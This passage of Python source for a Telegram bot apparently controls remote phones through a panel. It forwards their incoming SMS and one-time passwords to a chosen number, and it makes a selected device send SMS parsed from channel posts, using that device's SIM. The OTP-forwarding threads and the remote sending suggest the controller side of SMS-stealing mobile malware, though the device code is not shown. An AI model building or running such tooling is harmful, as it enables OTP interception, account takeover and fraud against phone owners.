                    EXECUTOR.submit(send_sms_command, user_id, device_id, forward_number, msg_text, from_number)
                    logger.warning(f"📥 Incoming SMS forwarded (fallback): {msg_text[:50]}")
                    
                    with DATA_LOCK:
                        cache[msg_key] = True
                        while len(cache) > MAX_PROCESSED_KEYS:
                            cache.popitem(last=False)
                        _processed_cache[user_id] = cache
                    
                    new_count += 1
                    EXECUTOR.submit(_send_confirmation, user_id, forward_number, msg_text)
                
                if new_count > 0:
                    with DATA_LOCK:
                        cfg = user_configs.get(user_id, {})
                        keys = list(_processed_cache.get(user_id, {}).keys())
                        cfg["processed_keys"] = keys[-MAX_PROCESSED_KEYS:]
                    save_user_configs()
        except Exception as e:
            logger.error(f"Msg fallback: {e}")
        time.sleep(0.5)  # ⚡ 0.5 SECOND


def _send_confirmation(user_id, forward_number, msg_text):
    try:
        safe_text = html.escape(msg_text[:100])
        safe_number = html.escape(str(forward_number))
        HTTP_CLIENT.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": int(user_id),
                "text": f"✅ Forwarded to {safe_number}:\n<code>{safe_text}</code>",
                "parse_mode": "HTML"
            },
        )
    except Exception as e:
        logger.error(f"Confirm: {e}")

# ============================
# CHANNEL PARSER
# ============================
_channel_user_cache = {}

def get_user_by_channel(channel_id):
    if channel_id in _channel_user_cache:
        return _channel_user_cache[channel_id]
    with DATA_LOCK:
        for uid, cfg in user_configs.items():
            if cfg.get("channel_id") == channel_id:
                _channel_user_cache[channel_id] = uid
                return uid
    return None


def _parse_channel_message(text, user_id):
    """⚡ Dual format parser"""
    to_number = None
    msg = None
    
    # Format 1: "📞 To: XXX"
    m = re.search(r"📞\s*To\s*:\s*([+\d][\d\s\+]{8,})", text, re.IGNORECASE)
    if m:
        to_number = re.sub(r'\s+', '', m.group(1).strip())
    
    # Format 2: "To (Tap to copy):"
    if not to_number:
        m = re.search(r"To\s*\(Tap to copy\)\s*[:\-]\s*\n?\s*([+\d][\d\s\+]{8,})", text, re.IGNORECASE)
        if m:
            to_number = re.sub(r'\s+', '', m.group(1).strip())
    
    # Fallback: Generic "To:"
    if not to_number:
        m = re.search(r"(?:^|\n)\s*To\s*[:\-]\s*([+\d][\d\s\+]{8,})", text, re.IGNORECASE | re.MULTILINE)
        if m:
            to_number = re.sub(r'\s+', '', m.group(1).strip())
    
    if not to_number:
        return None
    
    # Message: "💬 Message: XXX"
    m = re.search(r"💬\s*Message\s*:\s*(.+?)(?=\n\n📋|\n\n📱|\Z)", text, re.DOTALL | re.IGNORECASE)
    if m:
        msg = m.group(1).strip()
    
    # Body: "Body (Tap to copy):"
    if not msg:
        m = re.search(r"Body\s*\(Tap to copy\)\s*[:\-]\s*\n?\s*(.+?)(?=\n\n📱|\n\n📋|\Z)", text, re.DOTALL | re.IGNORECASE)
        if m:
            msg = m.group(1).strip()
    
    # Fallback: Generic "Message:" or "Body:"
    if not msg:
        m = re.search(r"(?:Message|Body)\s*(?:\([^\)]*\))?\s*[:\-]\s*(.+?)(?=\n\n📋|\n\n📱|\Z)", text, re.DOTALL | re.IGNORECASE)
        if m:
            msg = m.group(1).strip()
    
    if not msg:
        return None
    
    with DATA_LOCK:
        cfg = user_configs.get(user_id)
        if not cfg:
            return None
        selected = dict(cfg.get("selectedDevice", {}))
    
    device_id = selected.get("deviceId")
    if not device_id:
        return None
    from_number = selected.get("simPhoneNumber", "Unknown")
    
    return (to_number, msg, device_id, from_number)


async def handle_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.channel_post:
        return
    channel_id = update.channel_post.chat_id
    user_id = get_user_by_channel(channel_id)
    if not user_id:
        return
    text = update.channel_post.text
    if not text:
        return
    
    parsed = await asyncio.to_thread(_parse_channel_message, text, user_id)
    if not parsed:
        return
    
    to_number, msg, device_id, from_number = parsed
    EXECUTOR.submit(send_sms_command, user_id, device_id, to_number, msg, from_number)
    logger.warning(f"📤 Channel SMS → {to_number}")

# ============================
# MAIN
# ============================
def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # ⚡ Start FAST OTP fallback
    threading.Thread(target=smart_otp_fallback, daemon=True, name="otp_fallback").start()
    
    # ⚡ Start FAST incoming SMS fallback
    threading.Thread(target=smart_messages_fallback, daemon=True, name="msg_fallback").start()
    
    # ⚡ Start streams for existing users
    for uid in list(user_configs.keys()):
        if user_configs[uid].get("selectedDevice", {}).get("deviceId"):
            EXECUTOR.submit(start_user_stream, uid)
    
    setup_conv = ConversationHandler(
        entry_points=[CommandHandler("setup", setup_start)],
        states={
            URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
            CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
        },
        fallbacks=[CommandHandler("cancel", setup_cancel)],
    )
    app.add_handler(setup_conv)
    
    otp_conv = ConversationHandler(
        entry_points=[CommandHandler("setotp", setotp_command)],
        states={WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]},
        fallbacks=[CommandHandler("cancel", otp_cancel)],
    )
    app.add_handler(otp_conv)
    
    manual_sim_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(manual_sim_callback, pattern="^manual_sim_[12]_")],
        states={WAITING_MANUAL_SIM: [MessageHandler(filters.TEXT & ~filters.COMMAND, manual_sim_input)]},
        fallbacks=[CommandHandler("cancel", manual_sim_cancel)],
    )
    app.add_handler(manual_sim_conv)
    
    app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
    app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))
    app.add_handler(CallbackQueryHandler(check_membership_callback, pattern="^check_membership$"))
    app.add_handler(CallbackQueryHandler(back_to_devices_callback, pattern="^back_to_devices$"))
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("devices", devices_command))
    app.add_handler(CommandHandler("resetforward", reset_forward))
    
    app.add_handler(MessageHandler(filters.TEXT & filters.ChatType.CHANNEL, handle_channel_message))
    
    logger.warning("⚡⚡⚡ v15 FINAL - INCOMING SMS FIXED ⚡⚡⚡")
    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        pool_timeout=1,
    )

if __name__ == "__main__":
    main()